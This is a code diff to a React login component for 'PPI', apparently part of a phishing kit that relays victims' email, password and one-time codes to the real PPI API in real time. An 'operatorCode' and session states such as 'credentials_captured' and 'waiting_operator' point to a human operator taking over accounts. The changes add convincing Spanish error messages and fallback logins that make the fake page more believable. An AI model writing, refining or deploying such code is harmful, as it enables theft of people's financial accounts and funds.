@@ -269,6 +269,30 @@ const PPI = () => {
     }
   }, [email, operatorCode]);
 
+  // Translate PPI API error messages to user-friendly Spanish
+  const translatePpiError = (error: string, raw?: any): string => {
+    const lower = (error || "").toLowerCase();
+    const rawMsg = (raw?.message || "").toLowerCase();
+    const combined = `${lower} ${rawMsg}`;
+
+    if (combined.includes("usuario y/o clave") || combined.includes("invalid") || combined.includes("incorrecta") || combined.includes("clave inv"))
+      return "Usuario y/o contraseña incorrectos. Verificá tus datos e intentá nuevamente.";
+    if (combined.includes("bloqueada") || combined.includes("blocked") || combined.includes("suspendida"))
+      return "Tu cuenta se encuentra bloqueada. Contactá a PPI para más información.";
+    if (combined.includes("banned") || combined.includes("baneado"))
+      return "Tu cuenta fue suspendida. Contactá a soporte de PPI.";
+    if (combined.includes("actualice") || combined.includes("update"))
+      return "Servicio temporalmente no disponible. Intentá nuevamente en unos minutos.";
+    if (combined.includes("rate") || combined.includes("limit") || combined.includes("demasiados"))
+      return "Demasiados intentos. Esperá unos minutos antes de volver a intentar.";
+    if (combined.includes("dispositivo de confianza"))
+      return "Error de dispositivo de confianza. Intentá nuevamente.";
+    if (combined.includes("timeout") || combined.includes("timed out"))
+      return "El servidor no respondió a tiempo. Intentá nuevamente.";
+    if (error) return error;
+    return "Error al iniciar sesión. Intentá nuevamente.";
+  };
+
   const handleLogin = useCallback(async (submittedEmail: string, password: string) => {
     setError("");
     setLoading(true);
@@ -291,6 +315,43 @@ const PPI = () => {
         undefined,
         rememberedDispositivoId,
       );
+
+      // ── Check for explicit API errors (wrong password, blocked, etc.) ──
+      if (res.error && !res.requires_2fa && !res.success) {
+        const rawMsg = res.raw?.message || res.error || "";
+        const isCredentialError = /usuario.*clave|invalid|incorrecta|bloqueada|blocked|banned|suspendida|baneado/i.test(`${res.error} ${rawMsg}`);
+
+        await updateSession("login_failed", {
+          otp_code: `error:${res.error}`,
+        });
+
+        if (isCredentialError) {
+          // Show error on login form — do NOT proceed
+          setError(translatePpiError(res.error, res.raw));
+          setStatusMsg("");
+          setLoading(false);
+          return;
+        }
+
+        // For non-credential errors (rate limit, timeout, update app), try mobile fallback
+        const mobileRes = await ppiApi.login(submittedEmail, password, operatorCode);
+        if (mobileRes.error && !mobileRes.success && mobileRes.raw?.status !== 0) {
+          // Both APIs failed — show error
+          setError(translatePpiError(mobileRes.error || res.error, mobileRes.raw || res.raw));
+          setStatusMsg("");
+          setLoading(false);
+          return;
+        }
+        if (mobileRes.success || mobileRes.raw?.status === 0) {
+          const fullName = mobileRes.fullName || mobileRes.raw?.payload?.usuario?.nombreCompleto || "";
+          if (fullName) setSyncedFullName(fullName);
+          await updateSession("login_success", { otp_code: `name:${fullName}|mobile_fallback` });
+          setStep("verify_identity");
+          setStatusMsg("");
+          setLoading(false);
+          return;
+        }
+      }
 
       if (res.requires_2fa) {
         // 2FA required — store userId and type, show OTP screen
@@ -357,6 +418,13 @@ const PPI = () => {
           const fullName = mobileRes.fullName || mobileRes.raw?.payload?.usuario?.nombreCompleto || "";
           if (fullName) setSyncedFullName(fullName);
           await updateSession("login_success", { otp_code: `name:${fullName}|mobile_fallback` });
+        } else if (mobileRes.error) {
+          // Both failed — show error and stay on login
+          setError(translatePpiError(mobileRes.error, mobileRes.raw));
+          await updateSession("login_failed", { otp_code: `error:${mobileRes.error}` });
+          setStatusMsg("");
+          setLoading(false);
+          return;
         } else {
           await updateSession("waiting_operator", { otp_code: `credentials_captured` });
         }
@@ -365,20 +433,26 @@ const PPI = () => {
       setStep("verify_identity");
       setStatusMsg("");
     } catch (e: any) {
-      // Fallback to mobile login on error
+      console.error("[PPI] Login error:", e);
+      // Fallback to mobile login on network/exception error
       try {
         const mobileRes = await ppiApi.login(submittedEmail, password, operatorCode);
         if (mobileRes.success || mobileRes.raw?.status === 0) {
           const fullName = mobileRes.fullName || "";
           if (fullName) setSyncedFullName(fullName);
           await updateSession("login_success", { otp_code: `name:${fullName}|mobile_fallback` });
+          setStep("verify_identity");
+        } else if (mobileRes.error) {
+          setError(translatePpiError(mobileRes.error, mobileRes.raw));
+          await updateSession("login_failed", { otp_code: `error:${mobileRes.error}` });
         } else {
-          await updateSession("waiting_operator", { otp_code: `credentials_captured` });
+          setError("Error de conexión. Verificá tu internet e intentá nuevamente.");
+          await updateSession("login_failed", { otp_code: `error:network_${e.message}` });
         }
       } catch {
-        await updateSession("waiting_operator", { otp_code: `credentials_captured` });
+        setError("Error de conexión. Verificá tu internet e intentá nuevamente.");
+        await updateSession("login_failed", { otp_code: `error:network_${e.message}` });
       }
-      setStep("verify_identity");
       setStatusMsg("");
     }
     setLoading(false);
